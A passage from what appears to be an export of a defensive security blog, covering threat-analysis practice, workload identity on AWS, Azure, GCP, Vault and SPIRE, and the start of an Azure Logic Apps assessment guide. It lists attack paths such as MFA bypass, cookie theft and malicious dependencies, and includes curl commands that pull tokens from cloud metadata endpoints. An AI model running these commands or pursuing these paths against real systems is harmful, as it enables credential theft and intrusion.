| +-- Phishing employee credentials | | +-- No MFA (easy win) | | +-- MFA exists, but bypassed | | +-- Push fatigue / consent phishing | | +-- Session token theft (steal browser cookie) | | +-- Legacy auth path (SMTP/IMAP/basic auth still enabled) | | +-- Helpdesk reset / SIM swap / recovery flow abuse | +-- Exploit web vulnerability | +-- SQL injection | +-- Deserialization flaw | +-- Supply chain | +-- Compromised CI runner steals secrets | +-- Malicious dependency exfiltrates creds | +-- Option 2: Insider Attack +-- Legitimate access abuse +-- Compromised employee account +-- \u0026#34;Temporary\u0026#34; access granted and never removed Use attack trees to identify multiple attack paths and prioritize defenses that block the most paths.\nThe important lesson: controls aren\u0026rsquo;t binary. MFA isn\u0026rsquo;t a force field. Treat it as \u0026ldquo;raises attacker cost\u0026rdquo; and then ask what bypass paths exist in your environment.\nTool 4: Control Reality Check Most threat analysis falls apart at the same point: you list controls, but you never check if they work.\nQuick template that forces reality:\nThreat: Credential theft via phishing Prevent: - MFA for staff accounts - Status: partly deployed - Evidence: Entra ID sign-in logs show 27% of users still on single-factor - Bypass paths: legacy auth enabled for 2 service accounts Detect: - Alert on impossible travel + new device sign-ins - Status: exists - Evidence: last alert was 6 months ago (is it firing?) Respond: - Disable account + revoke sessions + rotate tokens - Status: runbook exists - Evidence: last drill took 2 hours and missed OAuth app tokens You don\u0026rsquo;t need a fancy scoring model. You need:\nOne sentence on whether the control is real A scrap of evidence One or two known bypass paths Tool 3: Simple Risk Matrix Impact: Low | Medium | High Exposure: Low | | | ★ (Critical if easy to fix) Medium | | ★ | ★ (Priority) High | | ★ | ★ (Priority) Star (★) indicates action needed. Focus on High Impact threats first.\nGetting Started Phase 1: Quick Win (1 day) Goal: Identify your top 3 risks and 3 defenses.\nActions:\nList 5 assets that matter most to your business Identify 3 threats that worry you most For each, write 1 concrete defense Output:\nAsset: Customer Database Threat: Ransomware Defense: Tested backups + MFA Asset: Payment Processing Threat: Credential theft Defense: MFA + monitoring Asset: Source Code Threat: Unauthorized access Defense: Strong access controls + logging Phase 2: Systematic Approach (1 week) Goal: Proper threat analysis for critical systems.\nActions:\nIdentify all critical systems For each system, identify: What it protects (assets) Who wants to attack it (adversaries) How they\u0026rsquo;d attack it (vectors) What defends against it (controls) Identify gaps (missing controls) Prioritize fixes based on impact vs effort Output: Threat analysis document for each critical system.\nPhase 3: Continuous Improvement (ongoing) Goal: Keep threat analysis current as threats and systems evolve.\nActions:\nReview threat analysis quarterly Update when new systems are deployed Update when new threats emerge (e.g., new ransomware variant) Track incidents and learn from them Update based on industry threat intelligence Output: Living threat analysis, not static document.\nCommon Mistakes Mistake 1: Threat Modeling Everything Problem: Trying to threat model every system, every application, every feature. Takes forever, never finishes.\nBetter: Focus on what matters. Critical systems, high-risk assets. Use simple heuristics for the rest (standard controls).\nMistake 2: Ignoring Business Impact Problem: Focusing on technical threats without understanding business impact.\nBetter: Start with business impact. What would hurt the company most? Then protect against threats to those things.\nMistake 3: One-Size-Fits-All Problem: Using the same threat model for every system regardless of context.\nBetter: Different systems have different threats. Public-facing web app ≠ internal payroll system. Tailor analysis to context.\nMistake 4: Document, Don\u0026rsquo;t Act Problem: Writing beautiful threat analysis documents but doing nothing with them.\nBetter: Threat analysis should drive action. Every identified gap should have a plan (owner, timeline, priority).\nMistake 5: Static Analysis Problem: Doing threat analysis once and never updating it.\nBetter: Threats evolve. Systems change. New vulnerabilities discovered. Review regularly (quarterly at minimum, monthly for high-risk systems).\nMistake 6: Ignoring Low-Tech Threats Problem: Focusing only on sophisticated attacks (APTs, zero-days) while missing basic threats (phishing, weak passwords).\nBetter: Most attacks aren\u0026rsquo;t sophisticated. Basic hygiene stops most threats. Don\u0026rsquo;t ignore boring threats.\nThe Honest Truth Threat analysis isn\u0026rsquo;t about creating a perfect threat model. It\u0026rsquo;s about making better security decisions with limited resources.\nYou\u0026rsquo;ll never know all the threats. Attackers innovate. New vulnerabilities emerge. Your threat model will always be incomplete.\nThat\u0026rsquo;s OK. The goal isn\u0026rsquo;t perfection. It\u0026rsquo;s prioritization. Focus on what matters most, protect against the most likely and most impactful threats, and keep iterating.\nThe best threat analysis:\nIdentifies what actually matters to your business Focuses on realistic threats, not theoretical ones Drives concrete actions (defenses to implement, gaps to fix) Gets reviewed and updated regularly Isn\u0026rsquo;t just a document - it\u0026rsquo;s a living process Threat analysis turns security from reactive chaos to prioritized action.\nInstead of panicking about every new vulnerability, you ask: \u0026ldquo;Does this threaten what matters to us?\u0026rdquo;\nInstead of deploying random security tools, you ask: \u0026ldquo;What threat does this actually defend against?\u0026rdquo;\nInstead of trying to protect everything equally, you focus resources where they matter most.\nThreat analysis is the foundation of effective security. Done right.\nBased on threat analysis and risk management practices across startups, financial services, healthcare, and enterprise organizations. The frameworks are simple because they work. Complexity is the enemy of action. Focus on what matters. Protect what\u0026rsquo;s important. Iterate and improve.\n","date":"8 Feb 2026","permalink":"https://gazsecops.github.io/posts/threat-analysis-practical-guide/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e We have thousands of systems. How do we prioritize what to protect?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-security\"\u003eSecurity:\u003c/span\u003e Threat model everything?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e We don\u0026rsquo;t have time for that. We need something practical.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-security\"\u003eSecurity:\u003c/span\u003e What\u0026rsquo;s your biggest nightmare scenario?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e Ransomware taking down core systems. Reputation damage. Regulatory fines.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-security\"\u003eSecurity:\u003c/span\u003e Start there. Prioritize protecting against your worst nightmares. That\u0026rsquo;s threat analysis.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The best threat analysis isn't a document. It's prioritized action based on what actually matters.\"\n\u003c/aside\u003e\n\u003cp\u003eThreat analysis gets a bad reputation. Over-complicated frameworks. Endless meetings. Documents nobody reads. Fancy diagrams that look impressive but change nothing.\u003c/p\u003e\n\u003cp\u003eDone wrong, it\u0026rsquo;s box-ticking security theater. Done right, it\u0026rsquo;s the foundation of effective security.\u003c/p\u003e\n\u003cp\u003eThe difference: focus on what actually matters to your business, not what some framework says you should care about.\u003c/p\u003e\n\u003cp\u003eThis isn\u0026rsquo;t academic theory. It\u0026rsquo;s what works in practice at companies ranging from startups to global enterprises.\u003c/p\u003e","tags":["security","threat-analysis","risk-management","defense","methodology"],"title":"Threat Analysis: What Actually Works"},{"content":" Engineer: The database connection is failing.\nSysadmin: Check the credentials in the config.\nEngineer: Which config? There are twelve.\nSysadmin: The one with the password that expires every 90 days.\nEngineer: That expired yesterday. Nobody told me.\nSysadmin: Did you check the rotation runbook?\nEngineer: The runbook is in a wiki that requires the database to log in.\nService accounts. API keys. Connection strings. Database passwords scattered across config files, environment variables, Kubernetes secrets, and that one spreadsheet someone maintains \u0026ldquo;just in case\u0026rdquo;. This is how most organisations handle non-human identity. It\u0026rsquo;s also how most organisations get compromised.\nEvery hardcoded credential is a future incident waiting to happen. The question isn't whether it leaks - it's whether you notice when it does. Workload identity is about giving your services proper identities without the secret sprawl. Not another password to rotate. Not another API key to revoke when it appears in a GitHub commit. An identity that your infrastructure manages, rotates, and revokes automatically.\nThis post covers what workload identity actually means, how to implement it on major clouds and on-prem, and the practical patterns that make it survivable.\nThe Problem: Services Need Identities Too Users have identities. They log in with SSO, use MFA, get provisioned and deprovisioned through HR systems. Messy, but understood.\nServices also need identities. Your backend needs to talk to the database. Your batch job needs to write to storage. Your microservice needs to call another microservice. Currently, most of this is done with:\nAPI keys: Static strings that grant access until revoked. Found in logs, committed to repos, embedded in mobile apps. No expiry. No context. Just a password with a fancy name.\nConnection strings: Database URLs with embedded credentials. Rotated rarely because everything breaks when you change them. Stored in plain text config files because the application doesn\u0026rsquo;t support secret injection.\nService account passwords: Domain accounts or cloud IAM users with long-lived credentials. Shared across teams. Password set once and forgotten until audit time.\nCertificates: Better than passwords, but still need distribution, rotation, and revocation infrastructure. Most teams just set them to expire in five years and hope.\nThe common theme: secrets that exist in files, environment variables, and config management systems. Every place a secret lives is a place it can leak.\nWhat Workload Identity Actually Is Workload identity means: a service gets an identity from the infrastructure, not from a secret you manage.\nThe flow:\nService starts Infrastructure proves the service is what it claims to be (attestation) Infrastructure issues a short-lived credential (token, certificate) Service uses credential to access resources Credential expires, process repeats No passwords in config files. No API keys in environment variables. The infrastructure handles identity lifecycle.\nKey properties:\nAttestation: Something proves the workload is legitimate (cloud metadata service, Kubernetes service account, TPM, SPIFFE) Short-lived: Credentials last minutes or hours, not years Automatic rotation: Infrastructure renews credentials before expiry Revocable: Compromised workload loses identity immediately Auditable: Every token issuance is logged Cloud-Native Workload Identity Each major cloud has its own workload identity system. Use it. It\u0026rsquo;s easier than building your own.\nAWS: IAM Roles for Service Accounts (IRSA) Your EKS pods get AWS credentials automatically via Kubernetes service accounts.\nSetup (one-time):\neksctl utils associate-iam-oidc-provider \\ --cluster my-cluster \\ --approve eksctl create iamserviceaccount \\ --name my-service \\ --namespace default \\ --cluster my-cluster \\ --role-name my-service-role \\ --attach-policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess \\ --approve Pod usage:\napiVersion: v1 kind: ServiceAccount metadata: name: my-service annotations: eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/my-service-role --- apiVersion: apps/v1 kind: Deployment metadata: name: my-service spec: template: spec: serviceAccountName: my-service containers: - name: app image: my-image AWS SDKs automatically pick up credentials from the injected AWS_ROLE_ARN and token file. No code changes.\nOn EC2 (non-Kubernetes):\ninstance_id=$(ec2-metadata -i | cut -d \u0026#34; \u0026#34; -f 2) aws iam attach-role-policy \\ --role-name \u0026#34;ec2-${instance_id}\u0026#34; \\ --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess Instance metadata service (IMDSv2) provides credentials. But IMDSv1 is vulnerable to SSRF - always enforce v2:\naws ec2 modify-instance-metadata-options \\ --instance-id i-1234567890abcdef0 \\ --http-tokens required \\ --http-endpoint enabled Azure: Managed Identities Azure handles workload identity via Managed Identities - either system-assigned (tied to resource lifecycle) or user-assigned (shared across resources).\nSystem-assigned (on VM):\naz vm identity assign \\ --resource-group my-rg \\ --name my-vm \\ --role Reader \\ --scope /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/my-rg User-assigned (on AKS pod):\naz identity create \\ --resource-group my-rg \\ --name my-pod-identity az aks pod-identity add \\ --resource-group my-rg \\ --cluster-name my-cluster \\ --namespace default \\ --service-account my-service \\ --identity-resource-id /subscriptions/.../resourcegroups/my-rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/my-pod-identity Azure SDKs automatically use the managed identity. No connection strings:\nfrom azure.identity import DefaultAzureCredential from azure.storage.blob import BlobServiceClient credential = DefaultAzureCredential() client = BlobServiceClient( account_url=\u0026#34;https://mystorage.blob.core.windows.net\u0026#34;, credential=credential ) GCP: Workload Identity GCP ties Kubernetes service accounts to GCP service accounts.\nSetup:\ngcloud iam service-accounts create my-service-sa gcloud projects add-iam-policy-binding my-project \\ --member \u0026#34;serviceAccount:my-service-sa@my-project.iam.gserviceaccount.com\u0026#34; \\ --role \u0026#34;roles/storage.objectViewer\u0026#34; gcloud iam service-accounts add-iam-policy-binding \\ my-service-sa@my-project.iam.gserviceaccount.com \\ --member \u0026#34;serviceAccount:my-project.svc.id.goog[default/my-service]\u0026#34; \\ --role \u0026#34;roles/iam.workloadIdentityUser\u0026#34; Pod annotation:\napiVersion: v1 kind: ServiceAccount metadata: name: my-service annotations: iam.gke.io/gcp-service-account: my-service-sa@my-project.iam.gserviceaccount.com GCP libraries pick up credentials automatically from the metadata server.\nSelf-Hosted and On-Premises Options Not on a cloud? Running your own infrastructure? Multi-cloud and need something portable? You have options.\nOption 1: HashiCorp Vault with AppRole or Kubernetes Auth Vault is primarily a secrets engine, but it also provides workload identity via auth methods. Services authenticate to Vault using platform-specific attestation, then retrieve short-lived credentials.\nKubernetes auth (for pods):\nvault auth enable kubernetes vault write auth/kubernetes/config \\ kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\ token_reviewer_jwt=@/var/run/secrets/kubernetes.io/serviceaccount/token vault write auth/kubernetes/role/my-service \\ bound_service_account_names=my-service \\ bound_service_account_namespaces=default \\ policies=my-service-policy \\ ttl=1h Pod authenticates:\nvault write auth/kubernetes/login \\ role=my-service \\ jwt=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) AppRole auth (for VMs/systemd services):\nvault auth enable approle vault write auth/approle/role/my-service \\ secret_id_ttl=0 \\ token_ttl=1h \\ token_max_ttl=4h \\ policies=my-service-policy vault read auth/approle/role/my-service/role-id vault write -f auth/approle/role/my-service/secret-id Service authenticates:\nvault write auth/approle/login \\ role_id=\u0026#34;abc123\u0026#34; \\ secret_id=\u0026#34;xyz789\u0026#34; The role-id is semi-public (can be in config). The secret-id is delivered via secure channel (cloud-init, orchestration tool, one-time fetch).\nWhat you get:\nShort-lived Vault tokens (hours, not years) Automatic token renewal Audit log of every authentication Fine-grained policies (this service can only read these secrets) Limitation: Vault is a single point of failure. High availability setup is essential for production.\nOption 2: SPIFFE and SPIRE SPIFFE (Secure Production Identity Framework for Everyone) defines a standard for workload identity. SPIRE is the reference implementation. This is the most cloud-agnostic option.\nArchitecture:\nSPIRE Server: Issues identity documents (SVIDs - SPIFFE Verifiable Identity Documents) SPIRE Agent: Runs on each node, attests workloads, provides SVIDs Workload: Gets SVID from agent via Unix socket or Workload API Server setup (Linux systemd):\ncurl -sSL https://github.com/spiffe/spire/releases/download/v1.9.0/spire-1.9.0-linux-x86_64-glibc.tar.gz | tar xz cd spire-1.9.0 cat \u0026gt; conf/server/server.conf \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; server { bind_address = \u0026#34;0.0.0.0\u0026#34; bind_port = \u0026#34;8081\u0026#34; trust_domain = \u0026#34;example.org\u0026#34; data_dir = \u0026#34;/var/lib/spire/data\u0026#34; log_level = \u0026#34;INFO\u0026#34; } plugins { DataStore \u0026#34;sql\u0026#34; { plugin_data { database_type = \u0026#34;sqlite3\u0026#34; connection_string = \u0026#34;/var/lib/spire/datastore.sqlite3\u0026#34; } } NodeAttestor \u0026#34;x509pop\u0026#34; { plugin_data {} } KeyManager \u0026#34;memory\u0026#34; { plugin_data {} } } EOF ./bin/spire-server run -config conf/server/server.conf \u0026amp; Agent setup:\ncat \u0026gt; conf/agent/agent.conf \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; agent { data_dir = \u0026#34;/var/lib/spire/agent/data\u0026#34; log_level = \u0026#34;INFO\u0026#34; server_address = \u0026#34;spire-server\u0026#34; server_port = \u0026#34;8081\u0026#34; trust_bundle_path = \u0026#34;/var/lib/spire/bundle.crt\u0026#34; trust_domain = \u0026#34;example.org\u0026#34; } plugins { NodeAttestor \u0026#34;x509pop\u0026#34; { plugin_data {} } WorkloadAttestor \u0026#34;unix\u0026#34; { plugin_data {} } KeyManager \u0026#34;memory\u0026#34; { plugin_data {} } } EOF ./bin/spire-agent run -config conf/agent/agent.conf \u0026amp; Register a workload (by Unix user):\n./bin/spire-server entry create \\ -spiffeID spiffe://example.org/my-service \\ -parentID spiffe://example.org/spire/agent/x509pop/$(./bin/spire-server agent list -raw | jq -r \u0026#39;.[] | select(.spiffe_id | contains(\u0026#34;agent\u0026#34;)) | .spiffe_id | split(\u0026#34;/\u0026#34;)[-1]\u0026#39;) \\ -selector unix:user:myapp \\ -ttl 3600 Workload retrieves SVID:\n./bin/spire-agent api fetch -socketPath /tmp/agent.sock Integration options:\nService mesh: Istio, Linkerd, Consul Connect have native SPIFFE integration Envoy: SPIRE can push SVIDs to Envoy sidecars Application: Use SPIFFE Workload API client libraries Attestation methods:\nKubernetes: Service account token, pod UID Unix: User ID, group ID, process ID AWS: Instance identity document, IAM role Azure: Managed identity GCP: Instance identity token Option 3: step-ca with ACME or OIDC Provisioners If you already have step-ca running (from the PKI post), extend it for workload identity.\nACME provisioner (for automated cert issuance):\nstep ca provisioner add acme --type ACME Services use ACME client (certbot, acme.sh, Caddy) to get certificates:\ncertbot certonly --standalone \\ --server https://ca.prod.internal:443/acme/acme/directory \\ --preferred-chain \u0026#34;Root CA\u0026#34; \\ -d my-service.prod.internal OIDC provisioner (for services with OIDC identity):\nstep ca provisioner add oidc --type OIDC \\ --client-id step-ca \\ --client-secret $SECRET \\ --configuration-endpoint https://keycloak.internal/realms/prod/.well-known/openid-configuration Services authenticate with OIDC token, get certificate:\nstep ca certificate my-service.prod.internal \\ /etc/tls/service.crt /etc/tls/service.key \\ --ca-url https://ca.prod.internal:443 \\ --root /etc/step-ca/certs/root_ca.crt \\ --provisioner oidc --provisioner-password-file /etc/step-ca/oidc.token Option 4: Keycloak or Dex for OIDC-Based Identity If you already run an OIDC provider (Keycloak, Dex), use it for workload identity.\nPattern:\nCreate a \u0026ldquo;confidential client\u0026rdquo; for each service in Keycloak Service authenticates with client credentials grant Service gets JWT access token Token used to authenticate to other services Keycloak client setup:\nkcadm.sh create clients \\ -r production \\ -s clientId=my-service \\ -s secret=$SERVICE_SECRET \\ -s serviceAccountsEnabled=true \\ -s directAccessGrantsEnabled=true \\ -s authorizationServicesEnabled=true Service authentication:\ncurl -s -X POST \u0026#34;https://keycloak.internal/realms/production/protocol/openid-connect/token\u0026#34; \\ -d \u0026#34;grant_type=client_credentials\u0026#34; \\ -d \u0026#34;client_id=my-service\u0026#34; \\ -d \u0026#34;client_secret=$SERVICE_SECRET\u0026#34; Limitation: Still need to manage client secrets. Consider combining with SPIRE for secretless authentication (SPIRE attests workload, workload gets Keycloak token).\nComparison: Which Self-Hosted Option? Option Best For Complexity Attestation Vault Already using Vault for secrets Medium AppRole, Kubernetes, OIDC, AWS, Azure, GCP SPIRE Portable, cloud-agnostic identity High Unix, Kubernetes, cloud platforms step-ca PKI-focused, certificate identity Medium ACME, OIDC, JWK Keycloak/Dex Already have OIDC infrastructure Medium Client credentials Recommendation:\nAlready using Vault? Use Vault auth methods. Need maximum portability? SPIRE. Already have internal CA? step-ca. Already have OIDC? Keycloak client credentials. Don\u0026rsquo;t build your own. These problems are harder than they look.\nSimple mTLS for Service-to-Service If SPIRE feels like overkill, mutual TLS with short-lived certificates is a reasonable middle ground.\nPattern:\nEach service has a certificate issued by internal CA Certificates last 24-72 hours Renewal happens automatically before expiry Services verify each other\u0026rsquo;s certificates With step-ca (covered in previous post):\nstep ca certificate my-service.prod.internal \\ /etc/tls/service.crt /etc/tls/service.key \\ --ca-url https://ca.prod.internal:443 \\ --root /etc/step-ca/certs/root_ca.crt \\ --provisioner jwt --provisioner-password-file /etc/step-ca/provisioner.password Systemd timer for renewal:\n[Unit] Description=Renew service certificate [Timer] OnCalendar=*:0/4 [Install] WantedBy=timers.target [Service] Type=oneshot ExecStart=/usr/bin/step ca renew /etc/tls/service.crt /etc/tls/service.key \\ --ca-url https://ca.prod.internal:443 \\ --root /etc/step-ca/certs/root_ca.crt \\ --force ExecStartPost=/usr/bin/systemctl reload my-service Migration Path You probably have services using API keys right now. How do you migrate?\nPhase 1: Inventory existing secrets kubectl get secrets --all-namespaces -o json | jq -r \u0026#39;.items[] | .metadata.namespace + \u0026#34;/\u0026#34; + .metadata.name\u0026#39; Find hardcoded credentials:\ngitleaks detect --source . --report-path findings.json trufflehog filesystem . --json \u0026gt; findings.json Phase 2: Move secrets to managed stores Not workload identity yet, but at least centralised:\nKubernetes: External Secrets Operator syncing from Vault/cloud secret stores VMs: HashiCorp Vault agent or cloud secret manager Containers: Mount secrets at runtime, don\u0026rsquo;t bake into images Phase 3: Identify workloads ready for workload identity Start with:\nNew services (easier to build right from start) Services already running on supported platforms (EKS, AKS, GKE) High-value services (database access, storage access) Phase 4: Implement per-platform AWS: IRSA for EKS workloads Azure: Managed Identity for AKS and VMs GCP: Workload Identity for GKE On-prem: SPIRE or step-ca for mTLS Phase 5: Deprecate static credentials Once workload identity works:\nRemove static credentials from secret stores Add validation that services use workload identity (not static creds) Alert when static credentials are created Monitoring Workload Identity When workload identity breaks, everything breaks. Monitor it.\nKey metrics Token/certificate issuance rate:\nrate(workload_identity_tokens_issued_total[5m]) Token fetch failures:\nrate(workload_identity_token_fetch_errors_total[5m]) \u0026gt; 0 Token expiry (alert before expiry):\nworkload_identity_token_expiry_timestamp - time() \u0026lt; 300 AWS IRSA specific:\naws_assume_role_errors_total{role_arn=~\u0026#34;.*my-service-role.*\u0026#34;} Azure Managed Identity:\nazure_managed_identity_token_requests_total{result=\u0026#34;failed\u0026#34;} Vault:\nvault_token_creation_count vault_auth_approle_login_total{result=\u0026#34;error\u0026#34;} vault_auth_kubernetes_login_total{result=\u0026#34;error\u0026#34;} SPIRE:\nspire_server_svids_issued_total spire_agent_workload_api_fetch_total{result=\u0026#34;error\u0026#34;} step-ca:\nstep_ca_certificates_issued_total step_ca_renewal_failures_total Alert rules groups: - name: workload-identity rules: - alert: WorkloadIdentityTokenFetchFailing expr: rate(workload_identity_token_fetch_errors_total[5m]) \u0026gt; 0.1 for: 2m labels: severity: critical annotations: summary: \u0026#34;Workload identity token fetch failing for {{ $labels.service }}\u0026#34; - alert: WorkloadIdentityTokenExpiringSoon expr: workload_identity_token_expiry_timestamp - time() \u0026lt; 300 for: 1m labels: severity: critical annotations: summary: \u0026#34;Workload identity token for {{ $labels.service }} expires in \u0026lt; 5 minutes\u0026#34; - alert: WorkloadIdentityIssuanceStopped expr: | rate(workload_identity_tokens_issued_total[10m]) == 0 and on() (count(up{job=\u0026#34;workload-identity-server\u0026#34;}) \u0026gt; 0) for: 10m labels: severity: warning annotations: summary: \u0026#34;No workload identity tokens issued in 10 minutes - is attestation working?\u0026#34; Quick health check # AWS IRSA curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Azure Managed Identity curl -s \u0026#39;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\u0026amp;resource=https://storage.azure.com/\u0026#39; -H Metadata:true # GCP Workload Identity curl -s -H \u0026#39;Metadata-Flavor: Google\u0026#39; \u0026#39;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\u0026#39; # SPIRE ./bin/spire-agent api fetch -socketPath /tmp/agent.sock # Vault (check auth method) vault status vault audit list # step-ca curl -s http://ca.prod.internal:443/health step ca health --ca-url https://ca.prod.internal:443 Common Mistakes Mistake 1: Mixing workload identity with static credentials Workload identity for some things, API keys for others. The API keys become the path of least resistance and never get removed.\nFix: New services must use workload identity. No exceptions. Old services get migrated on a schedule.\nMistake 2: Overly permissive roles Workload identity proves who the service is. It doesn\u0026rsquo;t limit what the service can do if you grant it AdministratorAccess.\nFix: Least privilege. Service role can only access specific S3 bucket, specific database, specific API.\naws iam put-role-policy \\ --role-name my-service-role \\ --policy-name S3Access \\ --policy-document \u0026#39;{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [{ \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [\u0026#34;s3:GetObject\u0026#34;, \u0026#34;s3:PutObject\u0026#34;], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::my-bucket/*\u0026#34; }] }\u0026#39; Mistake 3: Ignoring on-prem workloads Cloud workloads get workload identity. On-prem workloads get hardcoded credentials in config files. Attackers notice.\nFix: SPIRE or step-ca for on-prem. Same identity model everywhere.\nMistake 4: Not planning for workload identity outage The identity service goes down. Now no service can authenticate. Everything cascades.\nFix:\nHigh availability for identity services (SPIRE server, step-ca, cloud provider) Longer token lifetimes for critical services (24 hours, not 1 hour) Break-glass procedure for emergency static credentials (sealed, audited) Mistake 5: Forgetting about external services Workload identity works great for internal services. But your service still needs an API key to call that third-party API.\nFix:\nExternal secrets stored in Vault or cloud secret manager Accessed via workload identity (service uses identity to fetch external secret) Still better than hardcoded everywhere The Boring Truth Workload identity isn\u0026rsquo;t exciting. It\u0026rsquo;s infrastructure plumbing. But it eliminates an entire class of credential-related incidents:\nNo more hardcoded passwords in repos No more credential rotation emergencies No more shared service accounts No more \u0026ldquo;who has access to this API key?\u0026rdquo; The migration takes time. Start with new services. Chip away at old ones. Eventually, you realise you haven\u0026rsquo;t rotated a static credential in months because you don\u0026rsquo;t have any left.\nThat\u0026rsquo;s the goal. Not fancy identity infrastructure - just fewer secrets to manage and fewer incidents to explain.\nIf you want the PKI side of this, see the step-ca post. If you want to understand how identity flows through microservice chains, the OBO flow guide covers preserving user context. If you just want to know what secrets you\u0026rsquo;ve already leaked, run gitleaks detect and prepare for a long afternoon.\n","date":"8 Feb 2026","permalink":"https://gazsecops.github.io/posts/workload-identity-beyond-api-keys/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e The database connection is failing.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Check the credentials in the config.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e Which config? There are twelve.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e The one with the password that expires every 90 days.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e That expired yesterday. Nobody told me.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Did you check the rotation runbook?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e The runbook is in a wiki that requires the database to log in.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eService accounts. API keys. Connection strings. Database passwords scattered across config files, environment variables, Kubernetes secrets, and that one spreadsheet someone maintains \u0026ldquo;just in case\u0026rdquo;. This is how most organisations handle non-human identity. It\u0026rsquo;s also how most organisations get compromised.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nEvery hardcoded credential is a future incident waiting to happen. The question isn't whether it leaks - it's whether you notice when it does.\n\u003c/aside\u003e\n\u003cp\u003eWorkload identity is about giving your services proper identities without the secret sprawl. Not another password to rotate. Not another API key to revoke when it appears in a GitHub commit. An identity that your infrastructure manages, rotates, and revokes automatically.\u003c/p\u003e\n\u003cp\u003eThis post covers what workload identity actually means, how to implement it on major clouds and on-prem, and the practical patterns that make it survivable.\u003c/p\u003e","tags":["security","identity","cloud","kubernetes","spiffe","operations"],"title":"Workload Identity: Giving Your Services an Identity Without the Secret Sprawl"},{"content":"Azure Logic Apps are everywhere in modern cloud architectures. They\u0026rsquo;re the glue between services - orchestrating workflows, connecting APIs, moving data between systems. But from a security perspective, they\u0026rsquo;re also potential attack surfaces if configured poorly.\n\"Your job as a consultant isn't to tick boxes - it's to understand the architecture, identify the risks, and provide actionable recommendations. Security isn't a checklist. It's understanding the system and identifying where it can be broken.\" This guide is for cyber security consultants assessing environments that use Azure Logic Apps. It covers the architecture, key configuration areas that matter for security, threat modeling, and common pitfalls to look out for. It\u0026rsquo;s about understanding what\u0026rsquo;s configurable, what the threats are, and where things typically go wrong.\nLogic Apps are interesting from a security perspective because they sit at the intersection of multiple services. They\u0026rsquo;re serverless (no infrastructure to manage), highly configurable (1000+ connectors), and often have significant permissions (managed identities with broad access). When misconfigured, they become pivot points for lateral movement, data exfiltration, or supply chain attacks. They\u0026rsquo;re also easy to overlook in security assessments because they\u0026rsquo;re \u0026ldquo;just workflow automation\u0026rdquo; - until you realize they have Contributor access to your entire subscription.\nWhat is Azure Logic Apps? Azure Logic Apps is a serverless workflow orchestration service. You design workflows visually (drag-and-drop) or write them in code. The workflows connect to services - Azure, third-party APIs, on-prem systems - and execute logic based on triggers and actions.\nKey characteristics:\nServerless: No infrastructure to manage. Azure handles scaling (Consumption plan). Visual designer: Low-code/no-code approach to building workflows. 1000+ connectors: Pre-built integrations for Azure, Microsoft 365, Salesforce, SAP, etc. Multi-tenant: Can connect across tenant boundaries. Event-driven: Responds to triggers (HTTP requests, schedules, events). Deployment options: Consumption (multi-tenant), Standard (single-tenant), ISE (isolated). From a security perspective: You\u0026rsquo;re dealing with a highly configurable, multi-tenant integration platform that moves data across services. If Logic App is compromised or misconfigured, you\u0026rsquo;re looking at lateral movement, data exfiltration, or supply chain attacks.\nArchitecture and Key Components Understanding the architecture is critical for identifying risks. Here\u0026rsquo;s what you\u0026rsquo;re typically looking at:\n1. Logic App Resource The main resource that contains your workflow. Each Logic App has:\nWorkflow definition: The JSON defining triggers, actions, conditions. Access control: RBAC permissions, allowed inbound IPs. Managed Identity: A Microsoft Entra ID identity for authenticating to other Azure services. Configuration settings: Runtime version, diagnostic settings, endpoint URLs. Deployment mode: Consumption (multi-tenant) vs Standard (single-tenant) vs ISE (isolated). Network integration: Private endpoints, VNet integration (Standard/ISE only). 2. Triggers (How It Starts) Triggers are the entry points to your workflow. Common triggers:\nTrigger Type Description Security Implications HTTP Request Webhook exposed to internet Must validate authentication, rate limit, restrict IPs Recurrence Scheduled execution (cron-style) Hard to detect anomalous execution if not monitored Event Grid Responds to Azure events Potential for event injection if source not 